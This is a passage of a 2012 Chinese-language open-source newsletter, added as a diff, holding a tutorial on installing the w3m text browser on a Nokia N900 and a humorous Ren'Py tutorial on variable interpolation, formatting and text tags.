@@ -1,0 +1,1063 @@
+﻿________________________________________________________________
+
+□■□ 自由軟體鑄造場電子報第 209 期 | 2012/12/12 □■□
+________________________________________________________________
+
+◎ 本期主題︰於 NOKIA N900 上安裝 w3m on Maemo 5
+◎ 訂閱網址︰http://www.openfoundry.org/tw/news/
+◎ 下次發報時間︰2012/12/25
+
+□ 本期標題 □__________________________________________________
+
+■ [源碼秘技] 於 NOKIA N900 上安裝 w3m on Maemo 5
+
+■ [源碼秘技] 《雪凡與好朋友們的 Ren'Py 遊戲引擎初學心得提示》第五回：所以說語言是人類文明的瑰寶
+
+■ [源碼秘技] 簡報軟體 sozi 製作技巧 - inkscape + sozi = prezi + 開放自由
+
+■ [自由專欄] Richard Stallman 指責 Ubuntu 是「間諜軟體」
+
+■ [源碼新聞] 5 套敢於與 Android 競爭的行動 Linux 作業系統
+
+■ [源碼新聞] 駭客盜入網站後將惡意程式碼植入開源專案 Piwik 的安裝包
+
+■ [源碼新聞] 全球伺服器需求減少，Linux 伺服器不跌反升
+
+■ [源碼新聞] CentOS、FreeBSD、Debian 登陸 AWS
+
+■ [源碼新聞] OPEN 的力量：開啟音樂家的市場
+
+■ [源碼新聞] Taiwan WebConf，2013 年 1/12 ~ 1/13 在中研院人社館，英雄集結！
+_______________________________________________________________
+
+
+□ 本期內容 □__________________________________________________
+
+■ [源碼秘技] 於 NOKIA N900 上安裝 w3m on Maemo 5
+
+凍仁翔／文
+
+NOKIA N900 (http://en.wikipedia.org/wiki/Nokia_N900) 是支特別的智慧型手機，與其說是智慧型手機，用超迷你電腦來形容它才是比較合適的，當初凍仁會選上它的主要原因是可以在上面使用 Vim 這個強大的 Editor，可一年過去了 (當初為 2011 年 8 月入手)，它的效能已不足繼續作為主力使用，畢竟是 2010 年的產品。
+
+現在凍仁將它轉戰 Console 機並推居二軍使用，對於一位專業的 Linux 網管來說，有個輕便小巧的 Terminal 是件很棒的事情，因為大部份的事情我們都可以靠命令列 (command line) 完成，然而在種類眾多的純文字瀏覽器裡凍仁慣用的是 w3m。
+
+(http://www.openfoundry.org/images/121211/Nokia/w3m-on-n900.jpg)
+w3m 於 N900 上的截圖。
+
+原先想在 N900 上安裝 w3m 可以使用 (http://shimi.info/n900/) 提供的套件來源，而現在想在它上使用 w3m 除了自己編以外就剩 kumatux.org 提供的執行檔 (binary code)，不會編 ARM 的凍仁只好選擇後者的解決方案，也很幸運的讓它 work 了。
+
+
+1. 環境設定
+1.1. 新增 bin 目錄。
+
+    [ user@n900 ~ ]
+    $ mkdir bin && cd ~/bin [Enter]
+
+1.2. 補完執行檔路徑(PATH)。
+
+    [ user@n900 ~ ]
+    $ vi .profile [Enter]
+    PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/bin/X11:$HOME/bin
+
+1.3. 重新讀取 PATH。
+
+    [ user@n900 ~ ]
+    $ source .profile [Enter]
+
+
+2. 下載 binary 並解壓縮
+2.1. 下載 w3m.xxx.tar.xz
+
+    [ user@n900 ~ ]
+    $ wget http://kumatux.org/apps/w3m_0.5.2-void-not-ignored-patched_shiroikuma_2009-12-04-002333_fremantle_armel.tar.xz [Enter]
+
+2.2. 解壓縮 w3m.xxx.tar.zx。
+
+    [ user@n900 ~ ]
+    $ tar Jxvf w3m_0.5.2-void-not-ignored-patched_shiroikuma_2009-12-04-002333_fremantle_armel.tar.xz [Enter]
+
+2.3. 下載 gc.xxx.tar.xz
+
+    [ user@n900 ~ ]
+    $ wget http://kumatux.org/apps/gc_7.2alpha4_jj_2010-02-15-144600_fremantle_armel.tar.xz [Enter]
+
+2.4. 解壓縮 gc.xxx.tar.zx。
+
+    [ jonny@n900 ~ ]
+    $ tar Jxvf gc_7.2alpha4_jj_2010-02-15-144600_fremantle_armel.tar.xz [Enter]
+
+
+3. 安裝
+3.1. 複製 w3m 執行檔。
+
+    [ jonny@n900 ~ ]
+    $ cp w3m_0.5.2-void-not-ignored-patched_shiroikuma_2009-12-04-002333_fremantle_armel/bin/w3m* ~/bin [Enter]
+
+3.2. 查看 w3m 所需的 libary 後得知還需補完 libgc.so.1。
+
+    [ user@n900 ~ ]
+    $ ldd ~/bin/w3m [Enter]
+            libm.so.6 => /lib/libm.so.6 (0x40030000)
+            libnsl.so.1 => /lib/libnsl.so.1 (0x400a6000)
+            libdl.so.2 => /lib/libdl.so.2 (0x400c2000)
+            libgc.so.1 => not found
+            libncurses.so.5 => /lib/libncurses.so.5 (0x400cd000)
+            libgcc_s.so.1 => /lib/libgcc_s.so.1 (0x40114000)
+            libc.so.6 => /lib/libc.so.6 (0x40127000)
+            /lib/ld-linux.so.3 (0x40000000)
+
+3.3. 使用 root 權限 (若有安裝 rootsh 可以使用指令 root 來切換)。。
+[ jonny@n900 ~ ]
+ $ sudo gainroot [Enter]
+
+3.4. 補完 libgc.so.1。 
+[ root@n900 ~ ]
+ $ cp /home/user/gc_7.2alpha4_jj_2010-02-15-144600_fremantle_armel/lib/libgc.so.1.0.3 /lib/libgc.so.1 [Enter]
+
+3.5. w3m 補完 libary 計劃完成。
+
+    [ user@n900 ~ ]
+    $ ldd ~/bin/w3m [Enter]
+            libm.so.6 => /lib/libm.so.6 (0x40030000)
+            libnsl.so.1 => /lib/libnsl.so.1 (0x400a6000)
+            libdl.so.2 => /lib/libdl.so.2 (0x400c2000)
+            libgc.so.1 => /lib/libgc.so.1 (0x400cd000)
+            libncurses.so.5 => /lib/libncurses.so.5 (0x400cd000)
+            libgcc_s.so.1 => /lib/libgcc_s.so.1 (0x40114000)
+            libc.so.6 => /lib/libc.so.6 (0x40127000)
+            /lib/ld-linux.so.3 (0x40000000)
+
+
+4. 執行及測試
+4. 執行 w3m (執行結果應與上圖雷同)。
+
+    [ user@n900 ~ ]
+    $ w3m note.drx.tw [Enter]
+
+恭喜！現在我們可以在 N900 上愉快的使用 w3m 了 :-)
+
+
+【站內連結：】
+＊(w3m - 自訂快捷鍵(keymap)) http://note.drx.tw/2012/07/w3m-keymap.html
+
+相關連結：
+＊(Install kumatux.org on Nokia N900 | kumatux.org) http://kumatux.org/Nokia%20N900%20install.html
+＊(Download kumatux.org | kumatux.org) http://kumatux.org/Download.html
+＊(Applications | kumatux.org) http://kumatux.org/Applications.html
+
+資料來源：
+＊(GNU Emacs 23.1.1 for Nokia N900 - Page 6 - maemo.org - Talk) http://talk.maemo.org/showthread.php?p=602112
+＊(Run any app fullscreen - Page 2 - maemo.org - Talk) http://talk.maemo.org/showthread.php?p=576673
+_______________________________________________________________
+
+■ [源碼秘技] 《雪凡與好朋友們的 Ren'Py 遊戲引擎初學心得提示》第五回：所以說語言是人類文明的瑰寶
+
+林雪凡／文
+
+感謝大家在凜凜寒冬中也不忘準時收看本節目。各位好，這裡是主持人雪凡。
+
+(http://www.openfoundry.org/images/121211/RenPy/Head_Text_1_7.jpg) 「大家好，我是泰克斯 (text)。」
+
+(http://www.openfoundry.org/images/121211/RenPy/Head_Info_1_3.jpg) 「啊，在下是音符。」
+
+(http://www.openfoundry.org/images/121211/RenPy/Head_Secure_1_1.jpg) 「我是絲蔻兒。」
+
+(http://www.openfoundry.org/images/121211/RenPy/Head_Text_1_4.jpg)(http://www.openfoundry.org/images/121211/RenPy/Head_Info_1_3.jpg)(http://www.openfoundry.org/images/121211/RenPy/Head_Secure_1_1.jpg) 「各位好，我們是概念少女們！」
+
+(http://www.openfoundry.org/images/121211/RenPy/Head_Text_1_4.jpg) 「......說是這麼說，不過請允許我再次重申，我只是被拉來湊數的，性別什麼的應該很明顯才對。」
+
+(http://www.openfoundry.org/images/121211/RenPy/Head_Secure_1_5.jpg) 「確實看得出來，手術辛苦了呢，小泰。」
+
+(http://www.openfoundry.org/images/121211/RenPy/Head_Text_1_1.jpg) 「......儘管有點想問妳在鬼扯些什麼，不過想想果然還是沒有介意的必要吧。」
+
+(http://www.openfoundry.org/images/121211/RenPy/Head_Secure_1_2.jpg) 「切！稍微變頑強了一點呢。」
+
+(http://www.openfoundry.org/images/121211/RenPy/Head_Info_1_8.jpg) 「小泰、絲蔻兒，請別這樣......」
+
+呃……看來今天的氣氛會很火熱呢。到底是哪個傻瓜請那兩個同時來上節目的啊？社長！社長在哪裡？
+
+(http://www.openfoundry.org/images/121211/RenPy/Head_Secure_1_5.jpg) 「何必介意這種小事呢，這只是我們展現愛的方式而已啊。」
+
+確實能感覺到，一股歪曲過度的愛......
+
+(http://www.openfoundry.org/images/121211/RenPy/Head_Text_1_5.jpg) 「我會努力不製造您困擾的。請快點開始吧。」
+
+是、是嗎？說的也是。
+
+回到正題吧。
+
+本回要加以介紹的，是文字的特效與格式化。
+
+在由 Ren'Py 驅動的遊戲世界中，創作者可在文字中插入許多特別的「標籤」，來控制文字顯示時的效果。這些效果包括字型改變，顯示速度或滑鼠點擊的細部控制，還有諸如插入連結、插入行內圖片的功能。就算要插入變數，並將變數加以格式化，那也沒有問題。
+
+－－在角色吼叫的時候，將字體驟然放大，那不是很棒嗎？
+
+就讓我們研究看看這一切要如何進行吧。
+
+
+在文字中插入變數
+
+我們從比較抽象一點的地方開始，來聊聊變數吧。
+
+當我們希望遊戲中的文字能隨變數動態變化時，我們可以用 if 語句。這在第三回時做過示範。
+
+但說到底，if 語句本身，只適用在「數量有限的分歧」上面。當變數可能產生的結果太多－－比方說，允許玩家自由輸入角色名字－－時，企圖用 if 讓文字產生足夠多的分歧，可說是一件完全不可能的任務。
+
+這種時候，我們不應該用 if。取而代之，我們應該要在文字中間，直接插入變數本身！
+
+(http://www.openfoundry.org/images/121211/RenPy/Head_Text_1_1.jpg) 「想插入變數的話，請用方括號 ([])。以下由我示範，各位請看。」
+
+    # 文字輸入示範
+    text "雖然有些無趣，但基本的手續還是要辦一下的。"
+    text "請告訴我你的名字，我得做個記錄才行。"
+
+    # 使用以下所示的 renpy.input() 語句，可讓玩家自由輸入文字
+    # 第一個參數是提示字，第二個參數是預設值
+
+    $ name = renpy.input("您的名字是……", "路人丙")
+    
+    text "是[name]啊，很高興認識你。"
+
+另一種常見的使用方法，用來減少打字與剪貼量：
+
+menu:
+    "難得這個時間有空，去哪裡打發好呢？"
+    "艦橋":
+        position = "艦橋"
+    "戰情室":
+        position = "CIC"
+    "輪機室":
+        position = "輪機室"
+"啊，去[position]一趟好了。"
+
+還可以用來顯示某些內部狀態......
+
+"現在的好感度是：[luka_relation]！"
+
+只要巧妙使用，插入變數顯然能成為一項有力的法寶。
+
+
+跳脫
+
+或許各位會有疑問，以中括號作為標記，在字串中插入變數固然變得非常方便。不過如此一來，當想要在文字中顯示普通的方括號時，又要怎麼做呢？
+
+比方說，以下想要顯示一個方括號......
+
+ "聽我提起這個問題，愛爾想了想，將那本厚到無以復加的聖典取出。說真格的，這還是我第一次見到這本聖典發揮它原本該有的功能。"
+    el "我看看哦......啊，這裡是這樣寫的......[紅之章、第二節]：紅色的神明將在六輪奇月的照耀下降至地面，大地燃起審判的火焰。"
+
+(http://www.openfoundry.org/images/121211/RenPy/Head_Secure_1_5.jpg) 「這小劇場也寫太長了吧？」
+
+不要吐嘈！只是不知不覺就......嗯！回到正題。
+
+如果您直接打出以上台詞，那遊戲會立刻掛掉，因為遊戲引擎會在讀取上述第二句時，去找一個名叫「紅之章、第二節」的變數，但，當然找不到。而且我們也不是希望她輸出變數，而是希望它按照字面輸出，找到也沒用。
+
+我們需要的是「跳脫」。
+
+跳脫是程式設計中的一種常見概念，簡單說來，就是讓有特殊功能的字符（比如說 " 被用作為字串的邊界－－所以您不可能直接在字串中打入這個字），消除他的特殊功能，恢復字面上的意思，才能正確地以「字面意義」在字串裡使用。
+
+這種概念在很多程式語言中都有，不過作法各有不同。
+
+此處讓方括號進行跳脫，需要用 [[ 取代 [，如下：
+
+    el "我看看哦......啊，這裡是這樣寫的......[[紅之章、第二節]：紅色的神明將在六輪奇月的照耀下降至地面，大地燃起審判的火焰。"
+
+如此一來，實際顯示時，[[ 就會被替換為 [ 正常顯示出來，也不會再去試圖讀取變數了。
+
+
+插入變數的格式化
+
+述的中括弧內部，不光只能是個簡單的變數名，還可以包含 Python Format Specification Mini-Language 中的格式化描述符號。這能幫助各位輕鬆調節變數（通常是數字變數）的顯示方式，讓「同一個變數可以用不同的字串格式」顯示。
+
+有點複雜？
+
+說得更具體一點，可以讓一個數字在顯示時，改變顯示的位數究竟有幾位，或是前面補零、留空白等......諸如此類。
+
+
+【變數格式化的限制】(http://www.openfoundry.org/images/121211/RenPy/Head_Info_1_10.jpg) 音符：「那個......這邊提及的『變數格式化』，僅僅只影響『純文字字串』本身。至於替文字加上黑體斜體這類，「字串」本身沒有改變，只是讓「字體」變化的，那就不算在此處提及的變數格式化之處理範圍裡面。字體改變是文字標籤的任務，後面會提到。」
+
+
+變數格式化的寫法，是在變數後方接上半形冒號，再於冒號後方接上「格式描述」。比方說下面這個例子......
+
+$ pi = 3.1415926535
+"圓周率為：[pi:.2]"
+
+中括號中的 pi 是變數，至於半形冒號後面的 ".2"，那就是「格式描述」了！
+
+以上例來說，".2" 這個格式描述，代表 pi 將顯示到小數點後兩位，一言以蔽之，[pi:.2] 將會被代換為 "3.14"......嗯，是大家很熟悉的數字呢。
+
+變數格式化能用的格式，請參考這裡 (http://www.python.org/dev/peps/pep-3101/) 或這裡 (http://docs.python.org/dev/library/string.html#format-specification-mini-language) 這兩份 Python 文件。不過以上兩份文件都很難讀，就連主持人我都讀得很頭疼，加上 Ren'Py 與 Python 之間還有些小小差異需要您自行轉譯（見 Ren'Py 官網 (http://www.renpy.org/doc/html/text.html#interpolating-data)這裡 ）。故還是幫大家整理一下，列在下面。
+
+請看以下範例：
+
+   # 計算 CG 達成度
+
+    $ cg_total = 127
+    $ cg_get = 31
+    $ cg_complete = float(cg_get)/cg_total # 完成度
+
+    # 上面那行的 float() 函數，是用來將整數轉換成「可允許小數點存在」的「浮點數」用的。
+    # 因為程式本身設計，「整數除整數只能產生整數」，所以必須先把其中一項轉為浮點數，才能得出正確結果。
+    # 我知道這種設計很反人類啦，但各位看倌和我抱怨也沒用......
+
+# 未格式化的顯示結果： 0.244094488189
+
+    "CG 完成度為：[cg_complete]唷！"
+    # 一堆小數點，這絕對不是您想要的......
+
+
+# 「小數點加數字」：顯示小數點後指定的位數
+
+    "CG 完成度為：[cg_complete:.2]唷！" # 顯示： 0.24
+
+
+# 「雙百分比符號」：顯示百分數
+
+    "CG 完成度為：[cg_complete:%%]唷！" # 顯示： 24%
+    "CG 完成度為：[cg_complete:.2%%]唷！" # 這裡和小數點合併使用，顯示： 24.41%
+
+# ============================
+
+    # 武器攻擊力、武器防禦力
+    $ weapon_def = -15
+    $ weapon_att = 40
+
+# 「+ 或"空白"」：控制正負號顯示
+
+    "白銀之杖：被聖光祝福過的強大牧師手杖，對抗妖魔效果一流，不過神光也會吸引怪物攻擊"
+    "攻擊力[weapon_att]點！防禦力[weapon_def]點！"     # 兩數字分別顯示為：「40」、「-15」。如同此處示範，預設格式化的方式，是遇到負數才顯示負號。
+
+    "攻擊力[weapon_att:+]點！防禦力[weapon_def:+]點！" # 兩數字分別顯示為：「+40」、「-15」，正負號都會顯示。
+
+    "攻擊力[weapon_att: ]點！防禦力[weapon_def: ]點！" # 兩數字分別顯示為：「 40」、「-15」，正號不顯示但會留下空白空間。
+
+# ============================
+
+    # 可用金錢
+    $ budget = 231500000
+
+# 「,」：在大數中間加逗點
+    "銀庫裡目前還有[budget]元。請指示......" # 顯示「231500000」
+    "銀庫裡目前還有[budget:,]元。請指示......" # 顯示「231,500,000」
+
+雖然還有更多格式字串可以用，包括將數字顯示成科學計數法 (http://zh.wikipedia.org/zh-tw/%E7%A7%91%E5%AD%A6%E8%AE%B0%E6%95%B0%E6%B3%95) （如 1.322*e+13）、自動補空白對齊（但受限於字型實際上對不齊，除非您使用等寬字）等等，但......在遊戲設計中大都派不上用場。因此介紹就先到此為止。
+
+另外說明一下，前面介紹的格式字串大都可以混合使用，不過混合時有順序限制，這方面還請各位自行試試。或參考前述連結內的說明啦。
+
+
+標籤
+
+除了插入變數時所用的中括號以外，您還可在文字中插入兩兩成對的大括號「{}」，作為文字的格式標籤。透過由大括號構成的標籤，Ren'Py 遊戲引擎能為您輸入的文字，實現各種不同的格式與特效。
+
+許多標籤都會兩兩成對，合作框住要處理的文字，給文字作註解。就像是下面這樣：
+
+"文字{標籤名}標籤效果作用的文字範圍{/標籤名}文字"
+
+如果您有寫過 html 網頁原始碼的經驗，就會發現這和網頁標籤幾乎一模一樣！只是把角括號 () 給換成大括號 ({}) 而已－－前面的大括號中放著完整的標籤名稱；至於後面的大括號......請注意標籤名稱前方，有一道正斜線 (/)。
+
+除了將文字包裹起來的標籤以外，有些標籤是沒有尾部的，而是單獨一個就能產生效果，如暫停用的 {w} 標籤。另外還有些標籤可能要附加設定參數，如能提供連結功能的 {a} 標籤......
+
+－－不用著急，以下都會加以說明，這邊先留個印象就好。
+
+標籤大括號的跳脫方式與變數類似，只要您用「{{」來表示左大括號那就沒問題了。
+
+
+標籤速查
+
+可用的標籤很多，細節見這裡：http://www.renpy.org/doc/html/text.html#styling-and-text-tags。以下替大家做個快速導覽。
+
+基本字來，就能實現效果。
+
+
+＊b：黑體
+＊i：斜體
+＊s：劃掉
+＊u：下畫線
+
+舉例來說......
+
+     "普通文字{b}這是黑體{/b}{i}這是斜體{/i}{s}這是劃掉{/s}{u}這是底線{/u}\n{b}{i}既黑又斜{/i}{/b}的混合效果也沒問題"
+
+
+【字串中的 \n】上面的範例中，字串中間出現了一個長相奇怪的 \n 符號。
+這邊補充說明一下：在字串中間，\n 是換行的意思。
+
+(http://www.openfoundry.org/images/121211/RenPy/Head_Text_1_7.jpg) 泰克斯：「在第二回的節目中，有多少提過對吧？－－ Ren'Py 腳本中的故事，是以『邏輯行』為單位執行的。因此就算想要在字串中表達『換行』，你當然也不能真的按下鍵盤上的 return 按鈕－－那會打破邏輯行！......而為了將『換行』納為『行』的一部份，\n 就被各種程式語言，廣泛地用來代表換行時的 return 按鈕......這樣說能理解嗎？」
+
+(http://www.openfoundry.org/images/121211/RenPy/Head_Info_1_1.jpg) 音符：「小知識：\n 中的 n 其實是 "newline" 的意
+思唷。」
+
+上例會顯示成下面這樣：
+
+(http://www.openfoundry.org/images/121211/RenPy/01.jpeg)
+▲ 圖1：使用標籤後的顯示效果......請注意兩種不同的標籤是可以嵌合在一起的。
+
+效果一目了然，沒什麼解釋的必要。我們繼續。
+
+特殊字體調整
+
+以下標籤同樣與字體呈現方式有關，也需要透過前後兩個標籤標明影響範圍才能使用；但除此之外，這些還有些別的參數需要指定。
+
+
+＊color：輸入 #f00 之類的色碼，控制文字顏色
+＊size：指定字體大小。可以用 =+10 來增大減小，也可以設為絕對值
+＊font：字型，輸入為檔名。
+＊k：字元間距。可以加大每個字之間的距離。
+
+舉例來說......
+
+    "普通文字{color=#f00}顯示紅色{/color}{color=#0f0}顯示綠色{/color}\n{size=30}這是30號字{/size}預設大小{size=-5}減5{size=+10}再加10{/size}{/size}\n文字預設{k=0}是沒有間距的{/k}，{k=5}但可以增加間距{/k}"
+
+會顯示成下面這樣：
+
+(http://www.openfoundry.org/images/121211/RenPy/02.jpeg)
+▲ 圖2：特殊標籤設置後的效果。不含 font 示範。
+
+以上沒有示範 font 效果......這是因為授權問題比較難搞。有興趣的話還請各位自行試試吧。
+
+插入額外內容
+
+有些標籤不僅能變更現有文字的格式，還會在字串中插入一些特別的內容。如下......
+
+【a】
+
+替文字加上連結。
+
+此處所說的連結，可以是超連結（點擊後會打開網頁瀏覽器），也可以是 Ren'Py 內部跳轉用 label，點擊就會跳轉到由指定 label 標誌好的橋段。忘記 label 是什麼的同學，快回去複習第三回！
+
+範例：
+
+label start:
+    "歡迎參觀我們的{a=http://wfst.bolgspot.com}官網{/a}，或是進行{a=help}導引段落{/a}"
+    return
+    
+label help:
+    "這裡是幫助"
+
+(http://www.openfoundry.org/images/121211/RenPy/03.jpeg)
+▲ 圖3：連結效果。點擊「導引段落」會自動跳往 help 段落去。
+
+【image】
+
+您可以用 image 標籤，在文字中插入各式各樣的圖片，比方說流汗、愛心符號、驚慌等等的小圖示。
+
+當然囉，在運用這項功能之前，您必須先將圖片準備好，比方說下面這張圖片。
+
+(http://www.openfoundry.org/images/121211/RenPy/04.png)
+
+▲ 圖4：在下手刻的小圖示。檔名 "nervous.png"，尺寸 24x24 像素，應該能在「預設字體大小」與「預設對話框」的情境下直接使用。採用「cc-by 3.0 台灣」授權釋出。因為採用白色圖片與透明背景，所以在白色或淺色背景上是看不見的，這才把底色加深......黑底不是圖片的一部份，請注意。
+
+上面這張圖放到 game 資料夾下的 texticon 資料夾下，如下：
+
+遊戲專案資料夾/game/texticon/nervous.png
+
+準備妥當後，就能在遊戲中像是這樣地直接使用......
+
+    "什麼，等一下！這是徹頭徹尾的意外事件......我說等等！{image=texticon/nervous.png}"
+
+(http://www.openfoundry.org/images/121211/RenPy/05.jpeg)
+▲ 圖5：image 標籤效果示範。請注意 image 標籤是自封閉的，不需要在後方加上 {/image}。
+
+image 標籤可像上面那樣直接指派為一張圖檔，也能指派為一個第三回時介紹過的 image 物件。這表示他可以搭配 Ren'Py 的 ATL （Animation and Transformation Language 動畫轉置語言）引擎使用。用起來幾乎毫無限制，甚至可以用來製作文字內的小動畫！
+
+當然我們目前還沒聊到 ATL，這方面不好說明，之後再囉唆。
+
+行內圖示製作起來有些小要訣，這包括......
+
+
+＊預設會以行高的頂部為黏合點，拼入字串中。
+    ＊＊頂部像素看上去，會比旁邊文字來得略高。
+＊圖片在字串中佔據的寬度與高度，是由「圖片本身的寬高」來決定的。而不是依據周圍文字的寬高。這表示您最好手動控制一下圖片大小，讓圖片差不多等於文字大小，不然會很醜。
+＊＊據官網說法，圖片高度應該要儘量等於行高，不過很難找到確切的行高數值，建議用文字大小 + α 稍微默估一下就可以了。
+＊＊對於使用預設字體大小的人來說，我測試的感覺，理想尺寸應該是 24x24 px。請參考。
+＊建議自繪圖片時，左右預留至少 1px 的空白空間會比較漂亮。不要畫滿。
+
+另外也別忘記，在 unicode 中預設就有提供 ?☆??之類的字碼點；如果各位選用的字型有支援這些「文字圖案」的話，建議先從此處挑選，很多時候就不用去用 image 標籤繪圖貼圖了。畢竟 image 標籤需要考慮圖片大小問題，有時相當麻煩。至於 unicode 圖示本身則和文字一樣，處理起來會方便很多。推荐各位優先使用。
+
+(http://www.openfoundry.org/images/121211/RenPy/Head_Secure_1_4.jpg) 「看過來看過來！贈品大放送時間。下方是本回的贈品，這就發給各位囉！」
+
+(http://www.openfoundry.org/images/121211/RenPy/06.png)(http://www.openfoundry.org/images/121211/RenPy/07.png)(http://www.openfoundry.org/images/121211/RenPy/08.png)(http://www.openfoundry.org/images/121211/RenPy/09.png)(http://www.openfoundry.org/images/121211/RenPy/10.png)(http://www.openfoundry.org/images/121211/RenPy/11.png)
+▲ 圖6、7、8、9、10、11：這是在下手刻的小圖示，咱覺得用起來效果還是很不錯的，各位就請參考著用吧。授權同樣是「cc-by 3.0 台灣」。圖示雖小，畫起來還是很煩人的說......
+
+【space】、【vspace】
+
+以下兩個標籤可以增加空白量，而且使用時都不需要加上尾部標籤。
+
+＊space
+    在當前行中，加入指定數量的空白量，單位是像素。
+＊vspace
+    會立刻分行，並在下一行的垂直方向中，加入指定像素的額外行高。
+
+vspace 使用範例見此：
+
+"用一般分行方式\n分出來的行高{vspace=0}與用 vspace = 0 分出來的行，高度一樣；{vspace=20}而透過 vspace = ? 可以增加額外的行高。{vspace=-10}vspace 設為負數並沒有作用。"
+
+(http://www.openfoundry.org/images/121211/RenPy/12.jpeg)
+▲ 圖12：vspace 效果示意圖。
+
+"用在增加一段{space=50}額外空白上"
+
+(http://www.openfoundry.org/images/121211/RenPy/13.jpeg)
+▲ 圖13：space 標籤效果示意圖......咦？你問我為什不乾脆直接用空白替代？這......這要我怎麼說才好？要知道世界上有些問題是絕對不能問的啊......
+
+ruby text！
+
+嘩哈！終於出現了！上次預告過的，充滿著愛與夢想，還害咱被貼上醫療廢棄物標誌塞進垃圾桶的東西。
+
+先貼張圖來：
+
+(http://www.openfoundry.org/images/121211/RenPy/14.jpeg)
+▲ 圖14：各位，你們是紳士還是淑女......
+
+
+(http://www.openfoundry.org/images/121211/RenPy/Head_Info_1_11.jpg) 「我......我才沒有這樣說！為什麼是我？」
+
+(http://www.openfoundry.org/images/121211/RenPy/Head_Secure_1_2.jpg) 「哎呀呀？居然不是我呢？」
+
+(http://www.openfoundry.org/images/121211/RenPy/Head_Text_1_6.jpg) 「嘛......（推眼鏡）」
+
+這個......呃？我只是想讓妳說說看......？
+
+(http://www.openfoundry.org/images/121211/RenPy/Head_Info_1_11.jpg) 「你想死一次看看嗎？」
+
+等等！住......
+
+（進廣告）
+
+ruby text！
+
+嘩哈！終於出現了！上次預告過的，充滿著愛與夢想，還害咱被貼上醫療廢棄物標誌塞進垃圾桶的東西。
+
+先貼張圖來：
+
+(http://www.openfoundry.org/images/121211/RenPy/15.jpeg)
+▲ 圖15：ruby text 的範例。此哏源自竿尾悟的漫畫《超商無戰事》。好看推荐，可是我買不到第一集......順便一提，要是您覺得有什麼黑歷史被三言兩語帶過的話，那一定是您的錯覺。
+
+(http://www.openfoundry.org/images/121211/RenPy/Head_Secure_1_4.jpg) 「好有意思的錯覺呢......」
+
+囉唆！閉嘴！不管怎麼說，這就是 ruby text 了！
+
+ruby 這個詞源自日本，是日本印刷業界的術語。在維基百科 (http://zh.wikipedia.org/wiki/%E6%97%81%E8%A8%BB%E6%A8%99%E8%A8%98) 上有一些介紹，各位若有興趣大可前去翻翻，此處不囉唆。
+
+要在文字中產生 ruby text 效果，您必須同時使用兩個標籤：rb 與 rt。頂部的小字是由 rt (ruby on top) 定義，rb 則用來註記底部的字。比方說，剛剛那個範例事實上是這樣寫的：
+
+    "在{rb}ＤＭＺ{/rb}{rt}非武裝區{/rt}的便利商店中，\n{rb}ＡＴＭ{/rb}{rt}自動櫃員機{/rt}與{rb}ＡＴＭ{/rb}{rt}反戰車飛彈{/rt}的差別可是很重要的。"
+
+rb、rt 標籤的使用規則如下：
+
+＊rb 標籤須寫在前面，rt 標籤則緊跟在後。
+＊有時您也可以不寫 rb 標籤，僅僅只去寫 rt 標籤。不過這樣一來，rt 文字就只會出現在「前一個字符」的上面，而不是「前面整個詞」的上面。
+
+您現在可能很想馬上試試看 ruby text 效果，不過......
+
+(http://www.openfoundry.org/images/121211/RenPy/16.jpeg)
+▲ 圖16：直接使用 ruby text，你會收到一個 "Ruby glyph out of bounds" 的錯誤。
+
+以上錯誤的意思是說，您要求顯示一個 ruby 文字，但您沒有給他足夠的顯示空間......是的，Ren'Py 並不會自動替 ruby text 勻空間出來。想要使用 ruby text，您得自己動手，做一些事前配置。
+
+自己動手豐衣足食，請看下面的設定方式：
+
+# 先設定您所打算使用的 ruby 文字的特徵，這包括……
+init -1 python:
+    style.ruby_style = Style(style.default) # 這行表示用預設的 style 為模版，建立一個全新的 style，名字為 style.ruby_style
+    style.ruby_style.size = 12      # 設定 ruby 的字體大小是多少
+    style.ruby_style.yoffset = -20  # 「文字的高度」要「往下」偏移多少。因為期望中 ruby text 要往上偏，所以應該設成負值的。
+
+以上區塊可以貼在任何地方，不過作為設定的一部份，建議貼在 options.rpy 中比較適當。
+
+前面的手續完成，新的 ruby style 就算是建立好了，然而建立好歸建立好，這個全新的 style 目前卻沒有被套用到任何實際顯示項目中。您必須再去設定對話者，讓對話者去使用這個 ruby style：
+
+# 隨便找一個 init block，來設定敘事者（您也可以設定在 script.rpy 檔案最上方）。
+init:
+    define ruby = Character(what_ruby_style = style.ruby_style, what_line_leading = 10) # 一個沒有名稱的敘事者（旁白）
+    define info = Character("音符",  color = "#fff3c4") # 一個沒有 ruby 能力的敘事者，寫在這裡只是和下方做對比
+    define info_ruby = Character("音符",  color = "#fff3c4", what_ruby_style = style.ruby_style, what_line_leading = 10) # 一個帶有名字的敘事者
+
+和平常的敘事者設定相比，追加了兩個參數，包括：
+
+＊what_ruby_style
+    將您剛剛設定好的 ruby style 指定給它，讓它使用您指定的字體大小、高度渲染。
+＊what_line_leading
+    這個參數將定義「文字行上方」會被留下多少空間。數字愈大，每行文字的行高也會愈高。
+
+
+對於擁有 ruby 文字支援能力的敘事者來說，就算您沒有真的在文字中插入 ruby 字，line_leading 也會空在那裡，不會消失。而又因為平常沒在使用 ruby text 時，上面空著一大截空間很難看，故建議各位平常寫腳本時別用 ruby 敘事者說話，只要在 ruby 字出現時小用一下就好，這樣應該是比較妥當的用法。
+
+以上全數完成後，您就可以愉快地使用 ruby text 了，不過即使如此，如果不小心照顧她，您依然難免會在使用過程中碰上 "Ruby glyph out of bounds" 的問題，這是因為您雖然運用 line_leading 騰出了縱向行高，但是對於 ruby text 來說，其實橫向的寬度也是有限制的－－您不能讓 rt 字超出底部字 (rb) 允許的橫向空間太多。
+
+換句話說，小字的字數會受到大字的寬度所限制。要是您打太多字、字太長，那就會愉快地爆格......
+
+......嗯？您居然不覺得愉快？真是的，所以說這就是您嫩的地方了啊。具體地說，對於蹂躪不能坦率地感到歡愉，是無法從事這種好比幫地獄挖地窖的，充滿著燦爛希望的好工作啊......您看，地窖的天花板正在您頭頂上閃閃發亮呢。這是多麼美麗的現實啊！
+
+(http://www.openfoundry.org/images/121211/RenPy/Head_Text_1_1.jpg) 「......已經前往異世界去了呢。那傢伙。」
+
+(http://www.openfoundry.org/images/121211/RenPy/Head_Secure_1_5.jpg) 「只能放生了吧。」
+
+嘛，地窖的話題暫時到此為止吧。
+
